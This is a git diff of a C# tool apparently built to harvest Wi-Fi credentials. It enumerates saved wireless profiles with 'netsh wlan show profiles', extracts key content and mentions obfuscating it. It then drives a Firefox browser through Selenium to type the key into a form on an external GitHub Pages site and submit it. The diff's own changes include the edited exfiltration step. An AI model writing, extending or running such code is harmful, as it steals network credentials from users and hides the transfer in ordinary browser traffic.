@@ -3,14 +3,15 @@ using Windows.Devices.WiFi;
 using System.Collections.Generic;
 using System.Threading.Tasks;
 using System.Management.Automation;
-using WindowsInput;
-using System.Windows.Input;
+//using WindowsInput;
+//using System.Windows.Input;
 using System.Net.Http;
 using OpenQA.Selenium;
 using OpenQA.Selenium.Chrome;
 using OpenQA.Selenium.Edge;
 using OpenQA.Selenium.Firefox;
 using System.Diagnostics;
+using Microsoft.WindowsAPICodePack.Net;
 
 // https://github.com/PowerShell/PowerShell/issues/7909
 // dotnet publish -o .\publish -r win10-x64 -p:PublishSingleFile=true --self-contained true
@@ -20,17 +21,34 @@ namespace Remote_Key_Web_Based_Extraction
     class Remote_Key_Web_Based_Extraction
     {
         static List<string> access_point_names = new List<string>();
+        static List<string> user_profiles_list = new List<string>();
 
         static void Main(string[] args)
         {
             Remote_Key_Web_Based_Extraction main_program = new Remote_Key_Web_Based_Extraction();
+            //main_program.test();
+            user_profiles_list = main_program.user_profiles_scan();
+            
+            /*
             var ap_extraction_task = main_program.extract_access_point_names();
             ap_extraction_task.Wait();
             string key_content = main_program.local_key_content_extraction();
             Console.WriteLine("Opportunity to obfuscate key_content:");
             //string obfuscation = Console.ReadLine();
             //key_content += obfuscation;
-            main_program.web_content_key_extraction(access_point_names[0] + ":" + key_content);
+            //main_program.web_content_key_extraction(access_point_names[0] + ":" + key_content);
+            */
+        }
+
+        /*
+        public void test()
+        {
+            var networks = NetworkListManager.GetNetworks(NetworkConnectivityLevels.Connected);
+            foreach (var network in networks)
+            {
+                var sConnected = (network.IsConnected == true) ? " (connected)" : " (disconnected)";
+                Console.WriteLine("Network : " + network.Name + " - Category : " + network.Category.ToString() + sConnected);
+            }
         }
 
         public async Task extract_access_point_names()
@@ -46,6 +64,32 @@ namespace Remote_Key_Web_Based_Extraction
                 }
             }
         }
+        */
+
+        public List<string> user_profiles_scan()
+        {
+            List<string> temp_user_profiles_list = new List<string>();
+
+            Console.WriteLine("netsh wlan show profile");
+            PowerShell ps = PowerShell.Create();
+            ps.AddCommand("netsh")
+                .AddParameter("wlan show profiles");
+            var results = ps.Invoke();
+
+            foreach (var item in results)
+            {
+                Console.WriteLine(item);
+                if (item.ToString().Contains("All User Profile"))
+                {
+                    string user_profile_name = item.ToString().Substring(item.ToString().IndexOf(":") + 2, item.ToString().Length - (item.ToString().IndexOf(":") + 2));
+                    Console.WriteLine(user_profile_name);
+                    temp_user_profiles_list.Add(user_profile_name);
+                }
+            }
+            return temp_user_profiles_list;
+
+        }
+
 
         public string local_key_content_extraction()
         {
@@ -125,8 +169,7 @@ namespace Remote_Key_Web_Based_Extraction
                 Console.WriteLine(e);
                 Console.WriteLine("[=] Attempting to try FireFox");
                 OpenQA.Selenium.IWebDriver current_drver = new FirefoxDriver();
-                current_drver.Navigate();
-                current_drver.Url = "https://anthony-t-n.github.io/";
+                current_drver.Navigate().GoToUrl("https://anthony-t-n.github.io/");
                 current_drver.FindElement(OpenQA.Selenium.By.Name("message")).SendKeys(key_content);
                 current_drver.FindElement(OpenQA.Selenium.By.Name("send")).Click();
                 current_drver.Quit();
